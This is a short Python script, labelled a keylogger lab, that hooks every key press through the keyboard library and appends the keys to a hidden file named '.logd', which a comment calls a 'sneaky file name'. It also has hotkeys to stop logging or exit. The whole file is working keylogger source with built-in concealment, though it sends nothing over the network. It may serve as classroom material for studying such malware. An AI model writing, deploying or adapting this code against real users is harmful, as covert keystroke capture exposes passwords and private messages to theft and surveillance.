# keylogger lab

import keyboard


log_file = ".logd"  # sneaky file name --> where the keystrokes will be logged

def on_key_press(event):
    with open(log_file, "a") as f:
        if event.name in ["enter", "tab", "backspace", "shift", "ctrl", "alt"]:
            return
        f.write(event.name)

# Start logging --> will log all keystrokes to the log_file
keyboard.on_press(on_key_press) 

# Stop logging but keeps the program running 
keyboard.add_hotkey("ctrl+shift+q", lambda: keyboard.unhook_all()) 

# Exit the program entirely
keyboard.wait("esc") 

